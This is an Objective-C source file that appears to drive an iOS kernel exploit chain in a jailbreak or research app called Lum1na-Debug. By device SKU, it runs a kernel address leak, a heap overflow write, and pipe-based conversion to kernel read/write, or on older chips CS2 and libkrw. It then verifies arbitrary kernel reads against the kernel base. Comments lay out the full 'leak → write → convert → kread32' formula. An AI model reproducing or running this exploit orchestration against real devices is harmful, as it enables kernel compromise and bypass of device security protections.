//
//  P007KernelChain.m — KERNEL T1 for Lum1na-Debug.
//

#import "P007KernelChain.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabLearn.h"
#import "LabPathTest.h"
#import "P100AutoLearn.h"
#import "P139BootIntel.h"
#import "P044AksKaslrReach.h"
#import "P114SurfaceLeak.h"
#import "P149T8150Krw.h"
#import "P007Board.h"
#import "P007KreadLane.h"
#import "ClearSword/CS2Runner.h"
#import "lumina_core.h"

#include <fcntl.h>
#include <string.h>
#include <unistd.h>

#define KRW_BUILD @"t8150-krw-2"

@implementation P007KernelChain

+ (NSString *)tap {
    NSMutableString *acc = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    int fd = open([[docs stringByAppendingPathComponent:@"p007_kernel_log.txt"]
                   UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
    void (^L)(NSString *) = ^(NSString *line) {
        if (line.length == 0) return;
        NSString *o = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
        [acc appendString:o];
        if (fd >= 0) {
            const char *p = o.UTF8String;
            if (p) { write(fd, p, strlen(p)); fcntl(fd, F_FULLFSYNC); }
        }
    };

    LabSku sku = [LabDeviceProfile detectedSku];
    NSString *skuName = [LabDeviceProfile skuName] ?: @"?";
    L([NSString stringWithFormat:@"=== KERNEL T1 %@ BUILD %@ ===",
       LabLocalMilitaryNow() ?: @"?", KRW_BUILD]);
    L([LabDeviceProfile identBlock]);
    L([NSString stringWithFormat:@"[*] sku=%@  hasKread still kread32(kbase)==0xfeedfacf",
       skuName]);
    L(@"[*] P097 lock/unlock is catalog-solo. P110/P143/P054 stay catalog-solo. T8150 fires P149.");
    int coreSt = lumina_core_selftest();
    L([NSString stringWithFormat:@"[*] lumina_core %s selftest=%d",
       lumina_core_version(), coreSt]);

    L(@"[STEP 1] P100 AutoLearn (READ-ONLY packet)");
    NSString *p100 = nil;
    @try { p100 = [P100AutoLearn tap]; }
    @catch (NSException *e) { L([NSString stringWithFormat:@"[-] p100 %@", e.name]); }
    if (p100.length) [LabLearn ingestIdent:[LabDeviceProfile identBlock]];

    L(@"[STEP 2] P139 boot intel (no 150s lock/unlock)");
    if (sku == LabSkuA14_23F77 || sku == LabSkuT8150_24A435 || sku == LabSkuT8150_other) {
        NSString *p139 = nil;
        @try { p139 = [P139BootIntel tap]; }
        @catch (NSException *e) { L([NSString stringWithFormat:@"[-] p139 %@", e.name]); }
        [LabLearn ingestBootIntel];
        NSString *r139 = [LabPathTest scoreLog:p139 forPath:@"p139"];
        if ([[LabLearn row][@"p139_heap"] isKindOfClass:[NSString class]]) r139 = @"PASS";
        [LabLearn recordPath:@"p139" result:r139 evidence:@"KERNEL P139"];
        L([NSString stringWithFormat:@"PATH_TEST id=p139 class=harvest result=%@", r139]);
    } else {
        L([NSString stringWithFormat:@"[*] P139 SKIP on %@", skuName]);
    }

    L(@"[STEP 3] SKU door");
    if (sku == LabSkuA14_23F77) {
        L(@"[*] hunt occupancy TAP P044 N=192. conversion ≠ hasKread.");
        [LabDeviceProfile beginHuntGroom];
        NSString *gm = [LabDeviceProfile gameModeLine];
        if (gm.length) L(gm);
        NSString *p044 = nil;
        @try { p044 = [P044AksKaslrReach tap]; }
        @catch (NSException *e) { L([NSString stringWithFormat:@"[-] p044 %@", e.name]); }
        NSString *ro = [LabPathTest scoreLog:p044 forPath:@"occ"];
        NSString *rc = [LabPathTest scoreLog:p044 forPath:@"conv"];
        [LabLearn recordPath:@"occ" result:ro evidence:@"KERNEL P044"];
        [LabLearn recordPath:@"conv" result:rc evidence:@"KERNEL P044"];
        L([NSString stringWithFormat:@"PATH_TEST id=occ result=%@", ro]);
        L([NSString stringWithFormat:@"PATH_TEST id=conv result=%@", rc]);
    } else if (sku == LabSkuT8150_24A435 || sku == LabSkuT8150_other) {
        L(@"[*] 17 pair: P114 sel-8 serializer (READ-ONLY) then P149 conversion. 43748 clamp-CLOSED.");
        NSString *p114 = nil;
        @try { p114 = [P114SurfaceLeak tap]; }
        @catch (NSException *e) { L([NSString stringWithFormat:@"[-] p114 %@", e.name]); }
        NSString *r114 = [LabPathTest scoreLog:p114 forPath:@"p114"];
        [LabLearn recordPath:@"p114" result:r114 evidence:@"KERNEL P114"];
        L([NSString stringWithFormat:@"PATH_TEST id=p114 class=disclosure result=%@", r114]);
        L(@"[STEP 3b] P149 17 conversion (Prepare N=8 then 16463, kernel pipes). PANIC-POSSIBLE.");
        NSString *p149 = nil;
        @try { p149 = [P149T8150Krw tap]; }
        @catch (NSException *e) { L([NSString stringWithFormat:@"[-] p149 %@", e.name]); }
        NSString *r149 = [LabPathTest scoreLog:p149 forPath:@"p149"];
        [LabLearn recordPath:@"p149" result:r149 evidence:@"KERNEL P149"];
        L([NSString stringWithFormat:@"PATH_TEST id=p149 class=conversion result=%@", r149]);
    } else if (sku == LabSkuA14_21D50 || sku == LabSkuA13_22G100) {
        L(@"[*] 12 mini / A13: 43748 not live. KRW door is CS2 then libkrw.");
        P007Board *bb = [P007Board shared];
        if (!bb.hasKread) {
            NSString *cs = nil;
            @try { cs = [CS2Runner runUpstream]; }
            @catch (NSException *e) { L([NSString stringWithFormat:@"[-] cs2 %@", e.name]); }
            if (cs.length) {
                NSUInteger n = cs.length > 240 ? 240 : cs.length;
                L([cs substringToIndex:n]);
            }
        }
        if (!bb.hasKread) {
            bool armed = P007LaneArmBoard();
            L([NSString stringWithFormat:@"[*] libkrw P007LaneArmBoard %@",
               armed ? @"YES" : @"miss (stock / no provider)"]);
        }
    } else {
        L([NSString stringWithFormat:@"[*] no occupancy door on %@", skuName]);
    }

    L(@"[STEP 4] kread32(kbase)==0xfeedfacf");
    NSString *kt = nil;
    @try { kt = [P007Board tapKreadTest]; }
    @catch (NSException *e) { L([NSString stringWithFormat:@"[-] kreadtest %@", e.name]); }
    NSString *rk = [LabPathTest scoreLog:kt forPath:@"kread"];
    [LabLearn recordPath:@"kread" result:rk evidence:@"KERNEL kread"];
    L([NSString stringWithFormat:@"PATH_TEST id=kread result=%@", rk]);
    P007Board *b = [P007Board shared];
    L([NSString stringWithFormat:@"[*] board hasKread=%@ kbase=0x%llx",
       b.hasKread ? @"YES" : @"NO", (unsigned long long)b.kbase]);
    L(@"=== KERNEL T1 END ===");
    L(@"[*] Occupancy CLASS / P139 harvest / P114 REACH are not hasKread.");
    if (sku == LabSkuA14_23F77) {
        L(@"[*] hunt FORMULA: P044 N=192 occupancy → conversion unnamed → SocketKRW.Arm → kread32. P110/P142 catalog-solo.");
    } else if (sku == LabSkuT8150_24A435 || sku == LabSkuT8150_other) {
        L(@"[*] 17 FORMULA: leak(P114) → write(P142 prepare-then-overshoot inside P149) → convert(P149 pipes) → kread32(kbase)==0xfeedfacf → sptm(HOLD)");
        L(@"[*] PIPE-HIT / QUEUE-INIT is a write receipt, not kread32. P110 catalog-solo. AfterKread HOLD.");
    } else if (sku == LabSkuA14_21D50 || sku == LabSkuA13_22G100) {
        L(@"[*] 12 mini / A13 FORMULA: CS2/libkrw → kread32 → AfterKread FIRE. Staging files ≠ jailbreak.");
    }

    if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
    return acc;
}

@end
